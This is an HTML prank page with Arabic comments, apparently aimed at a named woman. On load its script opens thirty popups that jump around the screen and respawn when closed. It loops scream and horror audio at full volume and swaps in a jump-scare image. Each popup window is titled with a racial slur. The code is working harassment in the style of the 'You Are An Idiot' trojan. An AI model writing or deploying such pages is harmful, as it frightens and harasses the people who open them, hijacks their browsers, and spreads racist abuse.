<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>هند القحطاني ترحب بكم!</title>
  <style>
    body {
      background-color: black;
      color: crimson;
      text-align: center;
      font-size: 50px;
      margin-top: 20%;
      /* تأثير وميض الخلفية */
      animation: flicker 1s infinite alternate;
    }
    @keyframes flicker {
      0% { opacity: 1; }
      50% { opacity: 0.5; }
      100% { opacity: 1; }
    }
  </style>
  <script>
    // مصفوفة لتتبع النوافذ المنبثقة وخصائص حركتها
    let popupWindows = [];
    const NUM_WINDOWS = 30; // زيادة عدد النوافذ

    // دالة لفتح النوافذ المنبثقة
    function openPopups() {
      while (popupWindows.length < NUM_WINDOWS) {
        let newWin = window.open("", "", "width=300,height=200,resizable=yes,scrollbars=yes");
        if (newWin) {
          newWin.document.write(`
            <html>
              <head>
                <title>NIGGER</title>
                <style>
                  body {
                    background-color: black;
                    color: crimson;
                    font-size: 30px;
                    text-align: center;
                    margin-top: 50px;
                    animation: flicker 1s infinite alternate;
                  }
                  @keyframes flicker {
                    0% { opacity: 1; }
                    50% { opacity: 0.5; }
                    100% { opacity: 1; }
                  }
                </style>
              </head>
              <body>
                <div id="content">You Are An Idiot!</div>
                <script>
                  // بعد 5 ثواني، يتم استبدال النص بصورة قفزة (Jump Scare)
                  setTimeout(function() {
                    document.getElementById('content').innerHTML = '<img src="https://example.com/scary-image.jpg" alt="Scary" style="width:100%;height:auto;">';
                    // تشغيل صوت صراخ مفاجئ في النافذة
                    var popupAudio = new Audio('https://example.com/scream-sound.mp3');
                    popupAudio.play();
                  }, 5000);
                <\/script>
              </body>
            </html>
          `);
          popupWindows.push({
            win: newWin,
            x: Math.random() * (screen.width - 300),
            y: Math.random() * (screen.height - 200),
            dx: (Math.random() * 30 + 20) * (Math.random() < 0.5 ? -1 : 1),
            dy: (Math.random() * 30 + 20) * (Math.random() < 0.5 ? -1 : 1)
          });
        }
      }
    }

    // دالة لتحريك النوافذ بشكل عشوائي وبسرعة عالية
    function animatePopups() {
      setInterval(function() {
        popupWindows.forEach(function(obj) {
          if (obj.win && !obj.win.closed) {
            obj.win.moveTo(obj.x, obj.y);
            obj.x += obj.dx;
            obj.y += obj.dy;
            // عكس الاتجاه عند الوصول لحواف الشاشة
            if (obj.x < 0 || obj.x + 300 > screen.width) {
              obj.dx = -obj.dx;
            }
            if (obj.y < 0 || obj.y + 200 > screen.height) {
              obj.dy = -obj.dy;
            }
          }
        });
      }, 30); // تحديث كل 30 مللي ثانية لتحريك سريع
    }

    // دالة لتشغيل أصوات مخيفة في الخلفية
    function playHorrorSounds() {
      // صوت موسيقى رعب (استبدل الرابط برابط صالح)
      let audio1 = new Audio('https://example.com/horror-music.mp3');
      audio1.loop = true;
      audio1.volume = 1.0;
      audio1.play();

      // صوت صراخ (استبدل الرابط برابط صالح)
      let audio2 = new Audio('https://example.com/scream-sound.mp3');
      audio2.loop = true;
      audio2.volume = 1.0;
      setTimeout(() => {
        audio2.play();
      }, 500);
    }

    // دالة لمراقبة النوافذ وإعادة فتح أي نافذة يتم إغلاقها
    function maintainPopups() {
      setInterval(function() {
        popupWindows = popupWindows.filter(obj => obj.win && !obj.win.closed);
        if (popupWindows.length < NUM_WINDOWS) {
          openPopups();
        }
      }, 2000);
    }

    // بدء كل التأثيرات عند تحميل الصفحة الرئيسية
    window.onload = function() {
      openPopups();
      animatePopups();
      playHorrorSounds();
      maintainPopups();
    };
  </script>
</head>
<body>
  <h1>طيور هند القحطاني ترحب بك!</h1>
</body>
</html>
